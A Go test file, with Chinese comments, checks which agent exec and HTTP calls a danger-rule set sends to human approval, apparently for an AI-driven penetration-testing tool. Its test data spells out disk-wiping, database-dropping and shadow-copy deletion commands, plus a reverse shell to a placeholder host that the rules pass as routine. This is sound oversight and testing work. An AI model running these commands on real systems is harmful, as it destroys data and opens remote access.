package approval

import (
	"testing"
)

func ruleHits(t *testing.T, rule Rule, tool string, args map[string]any) bool {
	t.Helper()
	rule.Enabled = true
	compiled, err := compileRuleSnapshot([]Rule{rule})
	if err != nil {
		t.Fatalf("compile %s: %v", rule.ID, err)
	}
	hit, _ := compiled.rules[0].matches(Invocation{ToolName: tool, Arguments: args})
	return hit
}

// TestDefaultDangerRulesContract 是默认危险规则集的契约测试：
// 定义的每条规则对代表性命令的命中/放行行为必须稳定，防止后续调整引入回归。
func TestDefaultDangerRulesContract(t *testing.T) {
	rules, err := LoadBundledDangerRules()
	if err != nil {
		t.Fatal(err)
	}
	if len(rules) != 15 {
		t.Fatalf("默认规则集应为 15 条，实际 %d 条", len(rules))
	}
	byID := map[string]Rule{}
	for _, r := range rules {
		byID[r.ID] = r
	}
	for _, id := range []string{
		"danger.http.delete-method", "danger.http.destructive-path",
		"danger.http.critical-identity-mutation", "danger.http.critical-control-path",
		"danger.script.database-destruction", "danger.script.service-disruption",
		"danger.script.filesystem-wipe", "danger.script.destructive-http-operation",
		"class.c2.exec", "class.c2.tunnel", "class.c2.upload", "class.c2.kill-proc",
		"class.c2.load-assembly", "class.c2.self-delete", "class.c2.persist",
	} {
		if _, ok := byID[id]; !ok {
			t.Errorf("缺少定稿规则 %s", id)
		}
	}
	for _, legacy := range []string{
		"class.exec.generic", "class.exec.http-destructive",
		"danger.script.critical-http-operation", "class.http.control-path",
		"class.http.delete-method", "class.http.identity-mutation",
		"danger.c2.destructive-task", "danger.script.destructive-command",
	} {
		if _, ok := byID[legacy]; ok {
			t.Errorf("退役规则 %s 不应再出现在默认集中", legacy)
		}
	}

	cases := []struct {
		name string
		rule string
		cmd  string
		want bool
	}{
		// 删库
		{"裸drop误拦已修复", "danger.script.database-destruction", "echo drop-test", false},
		{"DROP DATABASE", "danger.script.database-destruction", `mysql -h x -e "DROP DATABASE production"`, true},
		{"DROP TABLE", "danger.script.database-destruction", `psql -c "DROP TABLE users"`, true},
		{"drop_table连写", "danger.script.database-destruction", `python3 exploit.py --sql "drop_table tmp"`, true},
		{"TRUNCATE TABLE", "danger.script.database-destruction", "mysql x -e 'TRUNCATE TABLE users'", true},
		{"普通delete语句不拦", "danger.script.database-destruction", `mysql -e "DELETE FROM logs WHERE id<100"`, false},
		// 重启/停服
		{"shutdown", "danger.script.service-disruption", "shutdown -h now", true},
		{"reboot", "danger.script.service-disruption", "reboot", true},
		{"systemctl stop", "danger.script.service-disruption", "systemctl stop sshd", true},
		{"service restart", "danger.script.service-disruption", "service mysql restart", true},
		{"init 0", "danger.script.service-disruption", "init 0", true},
		// 毁盘
		{"rm -rf 根", "danger.script.filesystem-wipe", "rm -rf / --no-preserve-root", true},
		{"rm -rf 系统目录", "danger.script.filesystem-wipe", "rm -rf /etc/nginx", true},
		{"rm -rf 临时目录放行", "danger.script.filesystem-wipe", "rm -rf /tmp/prod-data", false},
		{"dd 毁盘", "danger.script.filesystem-wipe", "dd if=/dev/zero of=/dev/sda", true},
		{"mkfs", "danger.script.filesystem-wipe", "mkfs.ext4 /dev/sdb1", true},
		{"chmod 777 系统目录", "danger.script.filesystem-wipe", "chmod -R 777 /etc", true},
		{"chmod 777 web目录放行", "danger.script.filesystem-wipe", "chmod 777 /var/www/html/shell.php", false},
		{"vssadmin 删影子", "danger.script.filesystem-wipe", "vssadmin delete shadows /all", true},
		// 命令级敏感接口
		{"curl DELETE", "danger.script.destructive-http-operation", "curl -s -X DELETE https://target/api/v1/panels/1", true},
		{"requests.delete", "danger.script.destructive-http-operation", `python3 -c "requests.delete('https://t/x')`, true},
		{"curl GET 放行", "danger.script.destructive-http-operation", "curl -s https://target/api/v1/panels", false},
		// 与硬闸清单对齐：硬闸会拦的路径必须也能进审批队列，
		// 否则硬闸直接 IsError 返回、不产生审批单，操作就成了无记录的死路。
		{"硬闸对齐 truncate", "danger.script.destructive-http-operation", "curl -s -X POST https://target/api/truncateTable", true},
		{"硬闸对齐 unlink", "danger.script.destructive-http-operation", "curl -s https://target/api/unlink", true},
		{"硬闸对齐 factory reset", "danger.script.destructive-http-operation", "curl -s https://target/api/factory-reset", true},
		{"对齐后只读探测仍放行", "danger.script.destructive-http-operation", "curl -s https://target/status", false},
		// 方法藏在变量/for 列表里：字面量提示会失明，按写方法纳入审批队列
		{"方法变量化 for 列表", "danger.script.destructive-http-operation", `for m in OPTIONS TRACE PUT DELETE HEAD POST; do curl -s -X $m "http://target/"; done`, true},
		{"方法变量化带引号", "danger.script.destructive-http-operation", `for m in PUT put pUt DELETE delete PATCH TRACE; do r=$(curl -s -X "$m" "http://target/"); done`, true},
		// 硬闸的间接方法识别同时覆盖 --request；规则层只认 -X 时会出现
		// "硬闸拦下但不产生审批单"的死路，故两者必须同宽。
		{"方法变量化长选项", "danger.script.destructive-http-operation", `M=PUT; curl -s --request $M "http://target/api/item/1"`, true},
		{"方法变量化长选项带引号", "danger.script.destructive-http-operation", `for m in PUT DELETE; do curl -s --request "$m" "http://target/api/item/1"; done`, true},
		{"只读 for 列表放行", "danger.script.destructive-http-operation", `for p in /a /b /c; do curl -s "http://target$p"; done`, false},
		// 常规渗透操作放行
		{"nmap 扫描放行", "danger.script.filesystem-wipe", "nmap -sV -p 1-65535 10.0.0.5", false},
		{"sqlmap 放行", "danger.script.database-destruction", "sqlmap -u http://x/a?id=1 --batch --dbs", false},
		{"反弹 shell 放行", "danger.script.filesystem-wipe", "bash -i >& /dev/tcp/x/4444 0>&1", false},
	}
	for _, tc := range cases {
		rule, ok := byID[tc.rule]
		if !ok {
			t.Fatalf("规则 %s 不存在", tc.rule)
		}
		if got := ruleHits(t, rule, "exec", map[string]any{"command": tc.cmd}); got != tc.want {
			t.Errorf("%s: 命中=%v 期望=%v (命令: %s)", tc.name, got, tc.want, tc.cmd)
		}
	}

	// 执行通道改名同样要纳管：eino 文件系统的 execute 与 exec 同属脚本执行面，
	// 之前只列 exec/execute-python-script，等于给了一条无审计的执行通道。
	channelCases := []struct {
		name string
		rule string
		tool string
		cmd  string
		want bool
	}{
		{"execute 通道删库", "danger.script.database-destruction", "execute", `mysql -e "DROP TABLE users"`, true},
		{"eino 通道毁盘", "danger.script.filesystem-wipe", "eino_fs::execute", "rm -rf /etc/nginx", true},
		{"execute 通道写接口", "danger.script.destructive-http-operation", "execute", "curl -s -X DELETE https://target/api/v1/panels/1", true},
		{"execute 通道只读放行", "danger.script.destructive-http-operation", "execute", "curl -s https://target/status", false},
	}
	for _, tc := range channelCases {
		rule, ok := byID[tc.rule]
		if !ok {
			t.Fatalf("规则 %s 不存在", tc.rule)
		}
		if got := ruleHits(t, rule, tc.tool, map[string]any{"command": tc.cmd}); got != tc.want {
			t.Errorf("%s: 命中=%v 期望=%v (通道 %s)", tc.name, got, tc.want, tc.tool)
		}
	}

	// HTTP 工具类
	httpCases := []struct {
		name   string
		rule   string
		method string
		path   string
		want   bool
	}{
		{"DELETE 方法", "danger.http.delete-method", "delete", "/api/v1/panels/1", true},
		{"GET 放行", "danger.http.delete-method", "get", "/api/v1/panels", false},
		{"删除类路径", "danger.http.destructive-path", "post", "/api/v1/panel/delete", true},
		{"账号删除接口", "danger.http.critical-identity-mutation", "post", "/admin/deleteuser?id=1", true},
		{"密码重置接口", "danger.http.critical-identity-mutation", "post", "/api/resetpassword", true},
		{"重启接口", "danger.http.critical-control-path", "post", "/api/system/reboot", true},
		{"普通查询放行", "danger.http.critical-control-path", "get", "/api/v1/dashboard", false},
		// 只读探测不进审批队列：敏感路径名本身不是危险信号，
		// 之前仅凭 URL 含 resetPassword 就把大量 GET 送进审计队列。
		{"GET 身份类路径不入队", "danger.http.critical-identity-mutation", "get", "/api/resetpassword", false},
		{"GET 删除类路径不入队", "danger.http.destructive-path", "get", "/api/v1/panel/delete", false},
		{"PUT 身份类路径仍入队", "danger.http.critical-identity-mutation", "put", "/api/resetpassword", true},
		{"GET 控制面仍拦", "danger.http.critical-control-path", "get", "/api/system/reboot", true},
	}
	for _, tc := range httpCases {
		rule := byID[tc.rule]
		args := map[string]any{"url": "https://target" + tc.path}
		if tc.method != "" {
			args["method"] = tc.method
		}
		if got := ruleHits(t, rule, "http-framework-test", args); got != tc.want {
			t.Errorf("%s: 命中=%v 期望=%v (%s %s)", tc.name, got, tc.want, tc.method, tc.path)
		}
	}
}
